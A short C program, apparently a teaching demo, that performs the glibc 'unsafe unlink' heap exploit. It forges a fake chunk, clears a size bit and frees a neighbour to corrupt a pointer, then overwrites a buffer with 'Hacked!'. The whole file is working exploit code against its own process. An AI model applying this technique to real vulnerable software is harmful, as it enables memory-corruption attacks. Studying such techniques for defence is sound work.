#include <stdlib.h>
#include <unistd.h>

struct Chunk
{
    long long pre_size, size;
    struct Chunk *fd, *bk;
};

const long long SIZE = 0xf0;

int main()
{
    char data[8] = "Hello!";
    void *first = malloc(SIZE);
    void *second = malloc(SIZE);

    struct Chunk *FAKE = (struct Chunk *) first;
    FAKE->fd = (struct Chunk *) (&first - 3);
    FAKE->bk = (struct Chunk *) (&first - 2);

    struct Chunk *secondHeader = (struct Chunk *) (second - 2 * 8);
    secondHeader->pre_size = SIZE;
    secondHeader->size &= ~0xff;

    free(second);
    *(long long *) (first + 3 * 8) = (long long) &data;
    *(long long *) first = 0x0a2164656b636148;

    write(1, (char *) data, 8);
}

